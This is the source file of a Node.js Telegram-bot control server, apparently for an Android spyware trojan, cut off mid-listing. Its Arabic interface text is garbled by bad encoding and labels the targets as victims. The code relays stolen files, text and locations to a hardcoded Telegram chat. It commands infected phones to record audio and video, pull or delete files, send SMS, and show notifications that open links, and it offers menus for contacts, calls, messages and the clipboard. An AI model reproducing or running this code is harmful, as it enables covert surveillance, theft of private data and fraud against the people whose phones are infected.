const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '8818726614:AAFl7f1EcH2LhOhRdH0vBoNOLtEgtca4i6I'
const id = '1279761289'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">طھظ… ط¨ظ†ط¬ط§ط­ طھط´ط؛ظٹظ„ ط§ظ„ط¨ظˆطھ ظ…ط·ظˆط± ط§ظ„ط¨ظˆطھ :   @Black_Clar /209</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `آ°â€¢ ط±ط³ط§ظ„ط© ظ…ظ†<b>${req.headers.model}</b> ط¬ظ‡ط§ط²`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `آ°â€¢ ط±ط³ط§ظ„ط© ظ…ظ†<b>${req.headers.model}</b> ط¬ظ‡ط§ط²\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `آ°â€¢ ظ…ظˆظ‚ط¹ ظ…ظ† <b>${req.headers.model}</b> ط¬ظ‡ط§ط²`, {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `آ°â€¢ ط¬ظ‡ط§ط² ط¬ط¯ظٹط¯ ظ…طھطµظ„\n\n` +
        `â€¢ ظ…ظˆط¯ظٹظ„ ط§ظ„ط¬ظ‡ط§ط² : <b>${model}</b>\n` +
        `â€¢ ط§ظ„ط¨ط·ط§ط±ظٹط© : <b>${battery}</b>\n` +
        `â€¢ ظ†ط¸ط§ظ… ط§ظ„ط§ظ†ط¯ط±ظˆظٹط¯ : <b>${version}</b>\n` +
        `â€¢ ط³ط·ظˆط­ ط§ظ„ط´ط§ط´ط© : <b>${brightness}</b>\n` +
        `â€¢ ظ…ط²ظˆط¯ : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `آ°â€¢ ظ„ط§ ظٹظˆط¬ط¯ ط¬ظ‡ط§ط² ظ…طھطµظ„\n\n` +
            `â€¢ ظ…ظˆط¯ظٹظ„ ط§ظ„ط¬ظ‡ط§ط² : <b>${model}</b>\n` +
            `â€¢ ط§ظ„ط¨ط·ط§ط±ظٹط© : <b>${battery}</b>\n` +
            `â€¢ ظ†ط¸ط§ظ… ط§ظ„ط§ظ†ط¯ط±ظˆظٹط¯ : <b>${version}</b>\n` +
            `â€¢ ط³ط·ظˆط­ ط§ظ„ط´ط§ط´ط© : <b>${brightness}</b>\n` +
            `â€¢ ظ…ط²ظˆط¯ : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('آ°â€¢ ط§ظ„ط±ط¬ط§ط، ظƒطھط§ط¨ط© ط±ظ‚ظ… ط§ظ„ط°ظٹ طھط±ظٹط¯ ط§ط±ط³ط§ظ„ ط§ظ„ظٹط© ظ…ظ† ط±ظ‚ظ… ط§ظ„ط¶ط­ظٹط©')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                'آ°â€¢ ط¬ظٹط¯ ط§ظ„ط§ظ† ظ‚ظ… ط¨ظƒطھط§ط¨ط© ط§ظ„ط±ط³ط§ظ„ط© ط§ظ„ظ…ط±ط§ط¯ ط§ط±ط³ط§ظ„ظ‡ط§ ظ…ظ† ط¬ظ‡ط§ط² ط§ظ„ط¶ط­ظٹط© ط§ظ„ط¦ ط§ظ„ط±ظ‚ظ… ط§ظ„ط°ظٹ ظƒطھط¨طھط© ظ‚ط¨ظ„ ظ‚ظ„ظٹظ„....\n\n' +
                'â€¢ ظƒظ† ط­ط°ط±ظ‹ط§ ظ…ظ† ط£ظ† ط§ظ„ط±ط³ط§ظ„ط© ظ„ظ† ظٹطھظ… ط¥ط±ط³ط§ظ„ظ‡ط§ ط¥ط°ط§ ظƒط§ظ† ط¹ط¯ط¯ ط§ظ„ط£ط­ط±ظپ ظپظٹ ط±ط³ط§ظ„طھظƒ ط£ظƒط«ط± ظ…ظ† ط§ظ„ظ…ط³ظ…ظˆط­ ط¨ظ‡ طŒ',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('آ°â€¢ ط¬ظٹط¯ ط§ظ„ط§ظ† ظ‚ظ… ط¨ظƒطھط§ط¨ط© ط§ظ„ط±ط³ط§ظ„ط© ط§ظ„ظ…ط±ط§ط¯ ط§ط±ط³ط§ظ„ظ‡ط§ ظ…ظ† ط¬ظ‡ط§ط² ط§ظ„ط¶ط­ظٹط© ط§ظ„ط¦ ط§ظ„ط±ظ‚ظ… ط§ظ„ط°ظٹ ظƒطھط¨طھط© ظ‚ط¨ظ„ ظ‚ظ„ظٹظ„....')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                'آ°â€¢ ط·ظ„ط¨ظƒ ظ‚ظٹط¯ ط§ظ„ظ…ط¹ط§ظ„ط¬ط© ط§ظ„ط±ط¬ط§ط، ط§ظ„ط§ظ†طھط¸ط§ط±........\n\n' +
                'â€¢ ط³طھطھظ„ظ‚ظ‰ ط±ط¯ظ‹ط§ ظپظٹ ط§ظ„ظ„ط­ط¸ط§طھ ط§ظ„ظ‚ظ„ظٹظ„ط© ط§ظ„ظ‚ط§ط¯ظ…ط© ط§ظ„ظ…ط·ظˆط± ط§ظ„ظ‡ط§ظƒط±ط§طھ @VA7_JX ظˆ @Black_Clar  ط§ظ„ط®ط§طµط© ط¨ط§ظ„ظ‚ظ†ط§ط© https://t.me/+xLfV-P0qALQ0MjFk ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ط§ظ„ط§ط¬ظ‡ط²ط© ط§ظ„ظ…طھطµظ„ط©"], ["طھظ†ظپظٹط° ط§ظ„ط§ظ…ط±"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('آ°â€¢ ط§ظ„ط±ط¬ط§ط، ظƒطھط§ط¨ط© ط§ظ„ط±ط³ط§ظ„ط© ط§ظ„ظ…ط±ط§ط¯ ط§ط±ط³ط§ظ„ظ‡ط§ ط§ظ„ط¦ ط§ظ„ط¬ظ…ظٹط¹')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'آ°â€¢ ط·ظ„ط¨ظƒ ظ‚ظٹط¯ ط§ظ„ظ…ط¹ط§ظ„ط¬ط© ط§ظ„ط±ط¬ط§ط، ط§ظ„ط§ظ†طھط¸ط§ط±........\n\n' +
                'â€¢ ط³طھطھظ„ظ‚ظ‰ ط±ط¯ظ‹ط§ ظپظٹ ط§ظ„ظ„ط­ط¸ط§طھ ط§ظ„ظ‚ظ„ظٹظ„ط© ط§ظ„ظ‚ط§ط¯ظ…ط© ط§ظ„ظ…ط·ظˆط± ط§ظ„ظ‡ط§ظƒط±ط§طھ @VA7_JX ظˆ @Black_Clar  ط§ظ„ط®ط§طµط© ط¨ط§ظ„ظ‚ظ†ط§ط© https://t.me/+xLfV-P0qALQ0MjFk ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ط§ظ„ط§ط¬ظ‡ط²ط© ط§ظ„ظ…طھطµظ„ط©"], ["طھظ†ظپظٹط° ط§ظ„ط§ظ…ط±"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('آ°â€¢ ط§ط¯ط®ظ„ ظ…ط³ط§ط± ط§ظ„ظ…ظ„ظپ ط§ظ„ط°ظٹ طھط±ظٹط¯ ط³ط­ط¨ط© ظ…ظ† ط¬ظ‡ط§ط² ط§ظ„ط¶ط­ظٹط©')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'آ°â€¢ ط·ظ„ط¨ظƒ ظ‚ظٹط¯ ط§ظ„ظ…ط¹ط§ظ„ط¬ط© ط§ظ„ط±ط¬ط§ط، ط§ظ„ط§ظ†طھط¸ط§ط±........\n\n' +
                'â€¢ ط³طھطھظ„ظ‚ظ‰ ط±ط¯ظ‹ط§ ظپظٹ ط§ظ„ظ„ط­ط¸ط§طھ ط§ظ„ظ‚ظ„ظٹظ„ط© ط§ظ„ظ‚ط§ط¯ظ…ط© ط§ظ„ظ…ط·ظˆط± ط§ظ„ظ‡ط§ظƒط±ط§طھ @VA7_JX ظˆ @Black_Clar  ط§ظ„ط®ط§طµط© ط¨ط§ظ„ظ‚ظ†ط§ط© https://t.me/+xLfV-P0qALQ0MjFk ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ط§ظ„ط§ط¬ظ‡ط²ط© ط§ظ„ظ…طھطµظ„ط©"], ["طھظ†ظپظٹط° ط§ظ„ط§ظ…ط±"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('آ°â€¢ ط§ط¯ط®ظ„ ظ…ط³ط§ط± ط§ظ„ظ…ظ„ظپ ط§ظ„ط°ظٹ طھط±ظٹط¯ ')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'آ°â€¢ ط·ظ„ط¨ظƒ ظ‚ظٹط¯ ط§ظ„ظ…ط¹ط§ظ„ط¬ط© ط§ظ„ط±ط¬ط§ط، ط§ظ„ط§ظ†طھط¸ط§ط±........\n\n' +
                'â€¢ ط³طھطھظ„ظ‚ظ‰ ط±ط¯ظ‹ط§ ظپظٹ ط§ظ„ظ„ط­ط¸ط§طھ ط§ظ„ظ‚ظ„ظٹظ„ط© ط§ظ„ظ‚ط§ط¯ظ…ط© ط§ظ„ظ…ط·ظˆط± ط§ظ„ظ‡ط§ظƒط±ط§طھ @VA7_JX ظˆ @Black_Clar  ط§ظ„ط®ط§طµط© ط¨ط§ظ„ظ‚ظ†ط§ط© https://t.me/+xLfV-P0qALQ0MjFk ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ط§ظ„ط§ط¬ظ‡ط²ط© ط§ظ„ظ…طھطµظ„ط©"], ["طھظ†ظپظٹط° ط§ظ„ط§ظ…ط±"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('آ°â€¢ ط§ط¯ط®ظ„ ط§ظ„ظ…ط¯ط© ط§ظ„ط°ظٹ طھط±ظٹط¯ طھط³ط¬ظٹظ„ طµظˆطھ ط§ظ„ط¶ط­ظٹط©')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'آ°â€¢ ط·ظ„ط¨ظƒ ظ‚ظٹط¯ ط§ظ„ظ…ط¹ط§ظ„ط¬ط© ط§ظ„ط±ط¬ط§ط، ط§ظ„ط§ظ†طھط¸ط§ط±........\n\n' +
                'â€¢ ط³طھطھظ„ظ‚ظ‰ ط±ط¯ظ‹ط§ ظپظٹ ط§ظ„ظ„ط­ط¸ط§طھ ط§ظ„ظ‚ظ„ظٹظ„ط© ط§ظ„ظ‚ط§ط¯ظ…ط© ط§ظ„ظ…ط·ظˆط± ط§ظ„ظ‡ط§ظƒط±ط§طھ @VA7_JX ظˆ @Black_Clar  ط§ظ„ط®ط§طµط© ط¨ط§ظ„ظ‚ظ†ط§ط© https://t.me/+xLfV-P0qALQ0MjFk ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ط§ظ„ط§ط¬ظ‡ط²ط© ط§ظ„ظ…طھطµظ„ط©"], ["طھظ†ظپظٹط° ط§ظ„ط§ظ…ط±"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('آ°â€¢ ط§ط¯ط®ظ„ ط§ظ„ظ…ط¯ط© ط§ظ„ط°ظٹ طھط±ظٹط¯ طھط³ط¬ظٹظ„ ط§ظ„ظƒط§ظ…ظٹط±ط§ ط§ظ„ط§ظ…ط§ظ…ظٹط©')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'آ°â€¢ ط·ظ„ط¨ظƒ ظ‚ظٹط¯ ط§ظ„ظ…ط¹ط§ظ„ط¬ط© ط§ظ„ط±ط¬ط§ط، ط§ظ„ط§ظ†طھط¸ط§ط±........\n\n' +
                'â€¢ ط³طھطھظ„ظ‚ظ‰ ط±ط¯ظ‹ط§ ظپظٹ ط§ظ„ظ„ط­ط¸ط§طھ ط§ظ„ظ‚ظ„ظٹظ„ط© ط§ظ„ظ‚ط§ط¯ظ…ط© ط§ظ„ظ…ط·ظˆط± ط§ظ„ظ‡ط§ظƒط±ط§طھ @VA7_JX ظˆ @Black_Clar  ط§ظ„ط®ط§طµط© ط¨ط§ظ„ظ‚ظ†ط§ط© https://t.me/+xLfV-P0qALQ0MjFk ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ط§ظ„ط§ط¬ظ‡ط²ط© ط§ظ„ظ…طھطµظ„ط©"], ["طھظ†ظپظٹط° ط§ظ„ط§ظ…ط±"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('آ°â€¢ ط§ط¯ط®ظ„ ط§ظ„ظ…ط¯ط© ط§ظ„ط°ظٹ طھط±ظٹط¯ طھط³ط¬ظٹظ„ ظƒط§ظ…ظٹط±ط§ ط§ظ„ط³ظ„ظپظٹ ظ„ظ„ط¶ط­ظٹط©')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'آ°â€¢ ط·ظ„ط¨ظƒ ظ‚ظٹط¯ ط§ظ„ظ…ط¹ط§ظ„ط¬ط© ط§ظ„ط±ط¬ط§ط، ط§ظ„ط§ظ†طھط¸ط§ط±........\n\n' +
                'â€¢ â€¢ ط³طھطھظ„ظ‚ظ‰ ط±ط¯ظ‹ط§ ظپظٹ ط§ظ„ظ„ط­ط¸ط§طھ ط§ظ„ظ‚ظ„ظٹظ„ط© ط§ظ„ظ‚ط§ط¯ظ…ط© ط§ظ„ظ…ط·ظˆط± ط§ظ„ظ‡ط§ظƒط±ط§طھ @VA7_JX ظˆ @Black_Clar  ط§ظ„ط®ط§طµط© ط¨ط§ظ„ظ‚ظ†ط§ط© https://t.me/+xLfV-P0qALQ0MjFk ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ط§ظ„ط§ط¬ظ‡ط²ط© ط§ظ„ظ…طھطµظ„ط©"], ["طھظ†ظپظٹط° ط§ظ„ط§ظ…ط±"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('آ°â€¢ ط§ط¯ط®ظ„ ط§ظ„ط±ط³ط§ظ„ط© ط§ظ„طھظٹ طھط±ظٹط¯ ط§ظ† طھط¸ظ‡ط± ط¹ظ„ط¦ ط¬ظ‡ط§ط² ط§ظ„ط¶ط­ظٹط©')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'آ°â€¢ ط·ظ„ط¨ظƒ ظ‚ظٹط¯ ط§ظ„ظ…ط¹ط§ظ„ط¬ط© ط§ظ„ط±ط¬ط§ط، ط§ظ„ط§ظ†طھط¸ط§ط±........\n\n' +
                'â€¢ ط³طھطھظ„ظ‚ظ‰ ط±ط¯ظ‹ط§ ظپظٹ ط§ظ„ظ„ط­ط¸ط§طھ ط§ظ„ظ‚ظ„ظٹظ„ط© ط§ظ„ظ‚ط§ط¯ظ…ط© ط§ظ„ظ…ط·ظˆط± ط§ظ„ظ‡ط§ظƒط±ط§طھ @VA7_JX ظˆ @Black_Clar  ط§ظ„ط®ط§طµط© ط¨ط§ظ„ظ‚ظ†ط§ط© https://t.me/+xLfV-P0qALQ0MjFk ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ط§ظ„ط§ط¬ظ‡ط²ط© ط§ظ„ظ…طھطµظ„ط©"], ["طھظ†ظپظٹط° ط§ظ„ط§ظ…ط±"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('آ°â€¢ ط§ط¯ط®ظ„ ط§ظ„ط±ط³ط§ظ„ط© ط§ظ„طھظٹ طھط±ظٹط¯ظ‡ط§ طھط¸ظ‡ط± ظƒظ…ط§ ط¥ط´ط¹ط§ط±')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                'آ°â€¢ ط±ط§ط¦ط¹ طŒ ط£ط¯ط®ظ„ ط§ظ„ط¢ظ† ط§ظ„ط±ط§ط¨ط· ط§ظ„ط°ظٹ طھط±ظٹط¯ ظپطھط­ظ‡ ط¨ظˆط§ط³ط·ط© ط§ظ„ط¥ط´ط¹ط§ط±\n\n' +
                'â€¢ ط¹ظ†ط¯ظ…ط§ ظٹظ†ظ‚ط± ط§ظ„ط¶ط­ظٹط© ط¹ظ„ظ‰ ط§ظ„ط¥ط´ط¹ط§ط± طŒ ط³ظٹطھظ… ظپطھط­ ط§ظ„ط±ط§ط¨ط· ط§ظ„ط°ظٹ طھظ‚ظˆظ… ط¨ط¥ط¯ط®ط§ظ„ظ‡ طŒ',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('آ°â€¢ ط±ط§ط¦ط¹ طŒ ط£ط¯ط®ظ„ ط§ظ„ط¢ظ† ط§ظ„ط±ط§ط¨ط· ط§ظ„ط°ظٹ طھط±ظٹط¯ ظپطھط­ظ‡ ط¨ظˆط§ط³ط·ط© ط§ظ„ط¥ط´ط¹ط§ط±')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'آ°â€¢ ط·ظ„ط¨ظƒ ظ‚ظٹط¯ ط§ظ„ظ…ط¹ط§ظ„ط¬ط© ط§ظ„ط±ط¬ط§ط، ط§ظ„ط§ظ†طھط¸ط§ط±........\n\n' +
                'â€¢ ط³طھطھظ„ظ‚ظ‰ ط±ط¯ظ‹ط§ ظپظٹ ط§ظ„ظ„ط­ط¸ط§طھ ط§ظ„ظ‚ظ„ظٹظ„ط© ط§ظ„ظ‚ط§ط¯ظ…ط© ط§ظ„ظ…ط·ظˆط± ط§ظ„ظ‡ط§ظƒط±ط§طھ @VA7_JX ظˆ @Black_Clar  ط§ظ„ط®ط§طµط© ط¨ط§ظ„ظ‚ظ†ط§ط© https://t.me/+xLfV-P0qALQ0MjFk ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ط§ظ„ط§ط¬ظ‡ط²ط© ط§ظ„ظ…طھطµظ„ط©"], ["طھظ†ظپظٹط° ط§ظ„ط§ظ…ط±"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('آ°â€¢ ط£ط¯ط®ظ„ ط±ط§ط¨ط· ط§ظ„طµظˆطھ ط§ظ„ط°ظٹ طھط±ظٹط¯ طھط´ط؛ظٹظ„ظ‡')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'آ°â€¢ ط·ظ„ط¨ظƒ ظ‚ظٹط¯ ط§ظ„ظ…ط¹ط§ظ„ط¬ط© ط§ظ„ط±ط¬ط§ط، ط§ظ„ط§ظ†طھط¸ط§ط±........\n\n' +
                'â€¢ ط³طھطھظ„ظ‚ظ‰ ط±ط¯ظ‹ط§ ظپظٹ ط§ظ„ظ„ط­ط¸ط§طھ ط§ظ„ظ‚ظ„ظٹظ„ط© ط§ظ„ظ‚ط§ط¯ظ…ط© ط§ظ„ظ…ط·ظˆط± ط§ظ„ظ‡ط§ظƒط±ط§طھ @VA7_JX ظˆ @Black_Clar  ط§ظ„ط®ط§طµط© ط¨ط§ظ„ظ‚ظ†ط§ط© https://t.me/+xLfV-P0qALQ0MjFk ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ط§ظ„ط§ط¬ظ‡ط²ط© ط§ظ„ظ…طھطµظ„ط©"], ["طھظ†ظپظٹط° ط§ظ„ط§ظ…ط±"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                'آ°â€¢ ظ…ط±ط­ط¨ط§ ط¨ظƒظ… ظپظٹ ط¨ظˆطھ ط§ظ„ط§ط®طھط±ط§ظ‚ ظ…ط·ظˆط± ط§ظ„ط¨ظˆطھ ط§ظ„ظ‡ط§ظƒط±ط§طھ @VA7_JX ظˆ @Black_Clar  ط§ظ„ط®ط§طµط© ط¨ط§ظ„ظ‚ظ†ط§ط© https://t.me/+xLfV-P0qALQ0MjFk \n\n' +
                'â€¢ ط¥ط°ط§ ظƒط§ظ† ط§ظ„طھط·ط¨ظٹظ‚ ظ…ط«ط¨طھظ‹ط§ ط¹ظ„ظ‰ ط§ظ„ط¬ظ‡ط§ط² ط§ظ„ظ…ط³طھظ‡ط¯ظپ طŒ ظپط§ظ†طھط¸ط± ط§ظ„ط§طھطµط§ظ„\n\n' +
                'â€¢ ط¹ظ†ط¯ظ…ط§ طھطھظ„ظ‚ظ‰ ط±ط³ط§ظ„ط© ط§ظ„ط§طھطµط§ظ„ طŒ ظپظ‡ط°ط§ ظٹط¹ظ†ظٹ ط£ظ† ط§ظ„ط¬ظ‡ط§ط² ط§ظ„ظ…ط³طھظ‡ط¯ظپ ظ…طھطµظ„ ظˆط¬ط§ظ‡ط² ظ„ط§ط³طھظ„ط§ظ… ط§ظ„ط£ظ…ط±\n\n' +
                'â€¢ ط§ظ†ظ‚ط± ط¹ظ„ظ‰ ط²ط± ط§ظ„ط£ظ…ط± ظˆط­ط¯ط¯ ط§ظ„ط¬ظ‡ط§ط² ط§ظ„ظ…ط·ظ„ظˆط¨ ط«ظ… ط­ط¯ط¯ ط§ظ„ط£ظ…ط± ط§ظ„ظ…ط·ظ„ظˆط¨ ط¨ظٹظ† ط§ظ„ط£ظ…ط±\n\n' +
                'â€¢ ط¥ط°ط§ ط¹ظ„ظ‚طھ ظپظٹ ظ…ظƒط§ظ† ظ…ط§ ظپظٹ ط§ظ„ط±ظˆط¨ظˆطھ طŒ ط£ط±ط³ظ„ /start  ط§ظ„ط£ظ…ط± طŒ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ط§ظ„ط§ط¬ظ‡ط²ط© ط§ظ„ظ…طھطµظ„ط©"], ["طھظ†ظپظٹط° ط§ظ„ط§ظ…ط±"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == 'ط§ظ„ط§ط¬ظ‡ط²ط© ط§ظ„ظ…طھطµظ„ط©') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    'آ°â€¢ ظ„ط§ طھظˆط¬ط¯ ط§ط¬ظ‡ط²ط© ظ…طھطµظ„ط© ظˆظ…طھظˆظپط±ط©\n\n' +
                    'â€¢ طھط£ظƒط¯ ظ…ظ† طھط«ط¨ظٹطھ ط§ظ„طھط·ط¨ظٹظ‚ ط¹ظ„ظ‰ ط§ظ„ط¬ظ‡ط§ط² ط§ظ„ظ…ط³طھظ‡ط¯ظپ'
                )
            } else {
                let text = 'آ°â€¢ ظ‚ط§ط¦ظ…ط© ط§ظ„ط§ط¬ظ‡ط²ط© ط§ظ„ظ…طھطµظ„ط© :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `â€¢ ظ…ظˆط¯ظٹظ„ ط§ظ„ط¬ظ‡ط§ط² : <b>${value.model}</b>\n` +
                        `â€¢ ط§ظ„ط¨ط·ط§ط±ظٹط© : <b>${value.battery}</b>\n` +
                        `â€¢ ظ†ط¸ط§ظ… ط§ظ„ط§ظ†ط¯ط±ظˆظٹط¯ : <b>${value.version}</b>\n` +
                        `â€¢ ط³ط·ظˆط­ ط§ظ„ط´ط§ط´ط© : <b>${value.brightness}</b>\n` +
                        `â€¢ ظ…ط²ظˆط¯ : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == 'طھظ†ظپظٹط° ط§ظ„ط§ظ…ط±') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    'آ°â€¢ ظ„ط§ طھظˆط¬ط¯ ط§ط¬ظ‡ط²ط© ظ…طھطµظ„ط© ظˆظ…طھظˆظپط±ط©\n\n' +
                    'â€¢ طھط£ظƒط¯ ظ…ظ† طھط«ط¨ظٹطھ ط§ظ„طھط·ط¨ظٹظ‚ ط¹ظ„ظ‰ ط§ظ„ط¬ظ‡ط§ط² ط§ظ„ظ…ط³طھظ‡ط¯ظپ'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, 'آ°â€¢ ط­ط¯ط¯ ط§ظ„ط¬ظ‡ط§ط² ط§ظ„ظ…ط±ط§ط¯ طھظ†ظپظٹط° ط¹ظ„ظٹظ‡ ط§ظ„ط§ظˆط§ظ…ط±', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, 'آ°â€¢ ط·ظ„ط¨ ط§ظ„ط§ط°ظ† ظ…ط±ظپظˆط¶')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`آ°â€¢ ط­ط¯ط¯ ط§ظ„ط«ظ†ط§ط، ظ„ظ„ط¬ظ‡ط§ط² : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: 'ط§ظ„طھط·ط¨ظٹظ‚ط§طھ', callback_data: `apps:${uuid}`},
                        {text: 'ظ…ط¹ظ„ظˆظ…ط§طھ ط§ظ„ط¬ظ‡ط§ط²', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: 'ط§ظ„ط­طµظˆظ„ ط¹ظ„ط¦ ط§ظ„ظ…ظ„ظپط§طھ', callback_data: `file:${uuid}`},
                        {text: 'ط­ط°ظپ ظ…ظ„ظپ', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: 'ط§ظ„ط­ط§ظپط¸ط©', callback_data: `clipboard:${uuid}`},
                        {text: 'ط§ظ„ظ…ظƒط±ظپظˆظ†', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: 'ط§ظ„ظƒط§ظ…ظٹط±ط§ ط§ظ„ط§ظ…ط§ظ…ظٹ', callback_data: `camera_main:${uuid}`},
                        {text: 'ط§ظ„ظƒط§ظ…ظٹط±ط§ ط§ظ„ط³ظ„ظپظٹ', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: 'ط§ظ„ظ…ظˆظ‚ط¹', callback_data: `location:${uuid}`},
                        {text: 'ظ†ط®ط¨', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: 'ط§ظ„ظ…ظƒط§ظ„ظ…ط§طھ', callback_data: `calls:${uuid}`},
                        {text: 'ط¬ظ‡ط§طھ ط§ظ„ط§طھطµط§ظ„', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: 'ظٹظ‡طھط²', callback_data: `vibrate:${uuid}`},
                        {text: 'ط§ط¸ظ‡ط§ط± ط§ظ„ط§ط®ط·ط§ط±', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: 'ط§ظ„ط±ط³ط§ظٹظ„', callback_data: `messages:${uuid}`},
